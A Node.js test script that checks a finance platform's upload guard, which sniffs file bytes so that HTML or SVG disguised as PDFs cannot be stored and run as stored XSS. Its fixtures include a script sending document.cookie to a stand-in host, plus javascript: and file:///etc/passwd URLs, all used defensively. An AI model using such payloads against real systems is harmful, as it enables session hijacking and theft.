#!/usr/bin/env node
/* What may be written into a column a browser will later open.
 *
 * Factsheets and FICA documents are stored as base64 `data:` URLs. Opening
 * one builds a blob URL, and a blob inherits the origin that built it — so a
 * stored `data:text/html;base64,…` runs its script as this platform, with
 * the reader's session. The type therefore has to be established on the
 * BYTES, before the row is written.
 *
 * Three ways in existed and none of them did that:
 *
 *   POST /api/factsheets/upload   read the type from req.body.mime_type or
 *                                 the data: prefix, and guarded the check
 *                                 with `if (effectiveMime && …)`. No
 *                                 mime_type and a file_url not starting
 *                                 `data:` gave an empty string, which is
 *                                 falsy, so the check was skipped entirely.
 *                                 Where a mime WAS present it was the
 *                                 caller's word, so text/html bytes labelled
 *                                 application/pdf passed.
 *
 *   PUT/PATCH/POST /api/tables/products   products.factsheet_url is written
 *                                 through the generic table route, which
 *                                 validated nothing. That is the copy the
 *                                 client portal pins as "Current".
 *
 *   /api/tables/kyc_documents     file_url and file_data, same route, same
 *                                 absence of any check.
 *
 * Run: DATABASE_URL=… DATABASE_SSL=false node server/scripts/check-uploaded-file-type.cjs
 */
'use strict';

if (!process.env.DATABASE_URL) {
  console.log('  SKIP  DATABASE_URL not set — see the header of this file');
  process.exit(0);
}

const fs   = require('fs');
const path = require('path');
const { Pool } = require('pg');

const ROOT = path.join(__dirname, '..', '..');
const SSL  = process.env.DATABASE_SSL === 'false' ? false : { rejectUnauthorized: false };
const db   = new Pool({ connectionString: process.env.DATABASE_URL, ssl: SSL });

let pass = 0, fail = 0;
const ok = (name, cond, detail) => {
  if (cond) { pass++; console.log(`  ✓ ${name}`); }
  else { fail++; console.log(`  ✗ ${name}${detail ? `\n      ${detail}` : ''}`); }
};
const read = rel => fs.readFileSync(path.join(ROOT, rel), 'utf8');

process.env.JWT_SECRET = process.env.JWT_SECRET || 'check-uploaded-file-secret';
const { validateStoredFile, sniff } = require(path.join(ROOT, 'server', 'services', 'uploadedFile.js'));

/* Fixtures built from real magic numbers rather than from strings that merely
   look right — the whole point is that the bytes decide. */
const dataUrl = (mime, buf) => `data:${mime};base64,${Buffer.from(buf).toString('base64')}`;
const PDF_BYTES  = Buffer.from('%PDF-1.4\n1 0 obj\n<<>>\nendobj\n%%EOF\n', 'latin1');
const PNG_BYTES  = Buffer.concat([Buffer.from([0x89,0x50,0x4E,0x47,0x0D,0x0A,0x1A,0x0A]), Buffer.alloc(32)]);
const JPG_BYTES  = Buffer.concat([Buffer.from([0xFF,0xD8,0xFF,0xE0]), Buffer.alloc(32)]);
const HTML_BYTES = Buffer.from('<script>fetch("//evil/"+document.cookie)</script>', 'latin1');
const SVG_BYTES  = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>x()</script></svg>', 'latin1');

const PDF  = dataUrl('application/pdf', PDF_BYTES);
const HTML = dataUrl('text/html',       HTML_BYTES);
const LIAR = dataUrl('application/pdf', HTML_BYTES);   // the bytes are HTML
const SVG  = dataUrl('image/svg+xml',   SVG_BYTES);

console.log('\nthe type comes from the bytes');
{
  ok('a PDF sniffs as a PDF', sniff(PDF_BYTES) === 'application/pdf', String(sniff(PDF_BYTES)));
  ok('a PNG sniffs as a PNG', sniff(PNG_BYTES) === 'image/png');
  ok('a JPEG sniffs as a JPEG', sniff(JPG_BYTES) === 'image/jpeg');
  ok('markup sniffs as nothing at all', sniff(HTML_BYTES) === null, String(sniff(HTML_BYTES)));
  ok('an SVG sniffs as nothing either', sniff(SVG_BYTES) === null,
     'an SVG is a document and can carry script');
  ok('a PDF with a byte-order mark in front is still a PDF',
     sniff(Buffer.concat([Buffer.from([0xEF,0xBB,0xBF]), PDF_BYTES])) === 'application/pdf',
     'real scanners emit these; refusing one is a support ticket');
  ok('empty bytes sniff as nothing', sniff(Buffer.alloc(0)) === null);
}

console.log('\nand the label cannot override them');
{
  const P = v => validateStoredFile(v, { allow: ['application/pdf'] });
  ok('a real PDF is accepted', P(PDF).ok === true, JSON.stringify(P(PDF)));
  ok('and recorded as a PDF', P(PDF).mime === 'application/pdf');
  ok('markup labelled text/html is refused', P(HTML).ok === false);
  ok('markup LABELLED application/pdf is refused too', P(LIAR).ok === false,
     'the old check read the label and would have stored this');
  ok('an SVG is refused where PDFs are wanted', P(SVG).ok === false);
  ok('a PNG is refused where PDFs are wanted', P(dataUrl('image/png', PNG_BYTES)).ok === false);
  ok('but accepted where images are wanted',
     validateStoredFile(dataUrl('image/png', PNG_BYTES),
       { allow: ['application/pdf', 'image/png'] }).ok === true);
  ok('the refusal says what the file actually is',
     /PNG image/.test(validateStoredFile(dataUrl('image/png', PNG_BYTES), { allow: ['application/pdf'] }).error || ''),
     'an admin whose .pdf is really something else needs to know which');
}

console.log('\nand only shapes this platform stores are accepted at all');
{
  const P = v => validateStoredFile(v, { allow: ['application/pdf'] });
  ok('an https link is accepted on its shape', P('https://cdn.example.com/f.pdf').ok === true);
  ok('javascript: is refused', P('javascript:alert(1)').ok === false);
  ok('file:// is refused', P('file:///etc/passwd').ok === false);
  ok('a data: URL that is not base64 is refused', P('data:text/html,<script>x</script>').ok === false,
     'the old prefix check saw "data:" and stopped there');
  /* The dangerous shape, and the reason ;base64 is required rather than
     assumed: a data: URL with no base64 marker whose TEXT happens to be
     valid base64. Decoding it as base64 yields a real PDF and it passes;
     a browser percent-decodes it instead and renders something else. What
     is validated has to be what is rendered. */
  {
    const asB64 = PDF_BYTES.toString('base64');
    ok('nor one whose plain text merely looks like base64',
       P(`data:application/pdf;charset=utf-8,${asB64}`).ok === false,
       'validated as base64, rendered as text — two different documents');
    ok('while the same payload marked base64 is accepted',
       P(`data:application/pdf;base64,${asB64}`).ok === true);
  }
  for (const v of ['', '   ', null, undefined]) {
    ok(`${JSON.stringify(v)} is refused`, P(v).ok === false);
  }
  ok('a file over the ceiling is refused',
     validateStoredFile(PDF, { allow: ['application/pdf'], maxBytes: 8 }).ok === false);
  ok('and the ceiling is stated in a readable unit',
     /\d+ KB|\d+\.\d MB/.test(validateStoredFile(PDF, { allow: ['application/pdf'], maxBytes: 8 }).error || ''),
     validateStoredFile(PDF, { allow: ['application/pdf'], maxBytes: 8 }).error);
}

/* ── The routes, driven ───────────────────────────────────────────────── */

const jwt = require(path.join(ROOT, 'server', 'node_modules', 'jsonwebtoken'));
const ADMIN = { id: 'u-fschk', email: 'fschk@svcapital.co.za', role: 'admin', first_name: 'Chk' };
const tokenFor = u => jwt.sign(u, process.env.JWT_SECRET, { algorithm: 'HS256', expiresIn: '10m' });

function drive(router, method, url, body, user) {
  return new Promise(resolve => {
    const req = {
      method, url, originalUrl: url, baseUrl: '', body: body || {}, query: {}, params: {},
      headers: { 'user-agent': 'check', authorization: 'Bearer ' + tokenFor(user || ADMIN) },
      cookies: {}, ip: '203.0.113.9',
      get(h) { return this.headers[String(h).toLowerCase()]; },
    };
    let code = 200;
    const res = {
      statusCode: 200,
      status(c) { code = c; this.statusCode = c; return this; },
      set() { return this; }, setHeader() { return this; },
      json(payload) { resolve({ status: code, body: payload }); return this; },
      send(payload) { resolve({ status: code, body: payload }); return this; },
    };
    router(req, res, () => resolve({ status: 404, body: { error: 'no route' } }));
  });
}

(async () => {
  try {
    await require(path.join(ROOT, 'server', 'db', 'setup.js'))().catch(() => {});
    const factsheets = require(path.join(ROOT, 'server', 'routes', 'factsheets.js'));
    const tables     = require(path.join(ROOT, 'server', 'routes', 'tables.js'));

    await db.query(
      `INSERT INTO investors (id, first_name, last_name, email)
       VALUES ('INV-FSCHK','Check','Investor','fschk.investor@example.test')
       ON CONFLICT (id) DO NOTHING`);
    await db.query(
      `INSERT INTO investment_pools (id,name,product_type,status,target_amount,raised_amount,
                                     min_investment,annual_rate,term_months,start_date,end_date)
       VALUES ('POOL-FSCHK','Factsheet Check Pool','cattle','open',100000,0,1000,0.12,12,
               CURRENT_DATE - 5, CURRENT_DATE + 30)
       ON CONFLICT (id) DO UPDATE SET status='open'`);

    console.log('\nthe factsheet upload route');
    {
      const up = (file_url, extra) => drive(factsheets, 'POST', '/upload',
        { pool_id: 'POOL-FSCHK', file_name: 'Check.pdf', file_url, ...extra });

      const good = await up(PDF);
      ok('a real PDF uploads', good.status === 200, JSON.stringify(good.body).slice(0, 160));
      ok('and the stored mime is the sniffed one',
         good.body?.data?.mime_type === 'application/pdf', String(good.body?.data?.mime_type));

      const evil = await up(HTML);
      ok('markup is refused', evil.status === 400, JSON.stringify(evil.body));

      const liar = await up(LIAR, { mime_type: 'application/pdf' });
      ok('markup labelled application/pdf is refused', liar.status === 400, JSON.stringify(liar.body));
      /* The exact shape the old guard let through: nothing to derive a mime
         from, so `if (effectiveMime && …)` never ran. */
      const bypass = await up('javascript:alert(1)');
      ok('the no-mime bypass is closed', bypass.status === 400, JSON.stringify(bypass.body));
      const empty = await up('');
      ok('an empty file_url is still refused', empty.status === 400);

      /* Claiming a harmless mime must not let the bytes through either. */
      const relabel = await up(HTML, { mime_type: 'application/pdf' });
      ok('a harmless label on hostile bytes is refused', relabel.status === 400);
    }

    console.log('\nthe generic table route, where the product factsheet is written');
    {
      const put = body => drive(tables, 'PUT', '/products/PROD-CATTLE', body);
      const before = (await db.query(`SELECT factsheet_url FROM products WHERE id='PROD-CATTLE'`)).rows[0];

      const evil = await put({ factsheet_url: HTML, factsheet_name: 'evil.pdf' });
      ok('markup is refused on products.factsheet_url', evil.status === 400, JSON.stringify(evil.body));
      ok('and the column is unchanged',
         (await db.query(`SELECT factsheet_url FROM products WHERE id='PROD-CATTLE'`)).rows[0].factsheet_url
           === (before ? before.factsheet_url : null));

      const good = await put({ factsheet_url: PDF, factsheet_name: 'ok.pdf' });
      ok('a real PDF is accepted', good.status === 200, JSON.stringify(good.body).slice(0, 120));

      const cleared = await put({ factsheet_url: null, factsheet_name: null });
      ok('clearing it still works', cleared.status === 200,
         'that is how a factsheet is removed — the guard must not block it');

      const evilKyc = await drive(tables, 'POST', '/kyc_documents',
        { id: 'KYCCHK-1', investor_id: 'INV-FSCHK', doc_type: 'id', file_url: HTML });
      ok('markup is refused on kyc_documents too', evilKyc.status === 400, JSON.stringify(evilKyc.body));
      ok('and nothing was written', (await db.query(
        `SELECT 1 FROM kyc_documents WHERE id = 'KYCCHK-1'`)).rows.length === 0);

      const okKyc = await drive(tables, 'POST', '/kyc_documents',
        { id: 'KYCCHK-2', investor_id: 'INV-FSCHK', doc_type: 'id',
          file_url: dataUrl('image/jpeg', JPG_BYTES) });
      /* The create route answers 201, not 200 — what matters is that it was
         not refused, and that the row carries the file it was given. */
      ok('a photographed ID is accepted',
         okKyc.status < 400 && okKyc.body && okKyc.body.id === 'KYCCHK-2',
         `${okKyc.status} ${JSON.stringify(okKyc.body).slice(0, 120)}`);

      const untouched = await drive(tables, 'POST', '/investor_notes',
        { id: 'NOTECHK-1', investor_id: 'INV-FSCHK', note: 'data:text/html;base64,AAAA' });
      ok('a table with no file columns is not affected',
         untouched.status !== 400 || !/file/i.test(JSON.stringify(untouched.body)),
         JSON.stringify(untouched.body).slice(0, 140));
    }

    console.log('\nevery write path is guarded, not just the one that was reported');
    {
      const t = read('server/routes/tables.js');
      /* Call sites, not the definition — `function storedFileRefusal(table,
         body)` matches the same text and made three calls read as four. */
      const guards = (t.match(/(?<!function )storedFileRefusal\(table, body\)/g) || []).length;
      ok('create, replace and update all call the guard', guards === 3, `${guards} of 3`);
      ok('the columns are named explicitly', /products:\s*\{ factsheet_url/.test(t) &&
         /kyc_documents:\s*\{[\s\S]{0,200}file_url/.test(t));

      const f = read('server/routes/factsheets.js');
      ok('the factsheet route no longer reads the caller’s mime',
         !/const effectiveMime/.test(f),
         'that variable WAS the bug — an empty one skipped the check');
      ok('and no longer stores it',
         !/mime_type \|\| 'application\/pdf'/.test(f) && /checked\.mime/.test(f));
      ok('the list route says why it failed',
         /console\.error\('\[factsheets\] list failed/.test(f),
         'it answered 500 and logged nothing, so none of this was diagnosable');
    }

    await db.query(`DELETE FROM product_factsheets WHERE pool_id = 'POOL-FSCHK'`);
    await db.query(`DELETE FROM kyc_documents WHERE id LIKE 'KYCCHK-%'`);
    await db.query(`DELETE FROM investor_notes WHERE id = 'NOTECHK-1'`).catch(() => {});
    await db.query(`DELETE FROM investors WHERE id = 'INV-FSCHK'`).catch(() => {});
    await db.query(`DELETE FROM investment_pools WHERE id = 'POOL-FSCHK'`);
  } catch (err) {
    console.error('\n  ✗ threw:', err.stack || err.message);
    fail++;
  } finally {
    await db.end().catch(() => {});
    console.log(`\n${pass} passed, ${fail} failed`);
    process.exit(fail ? 1 : 0);
  }
})();
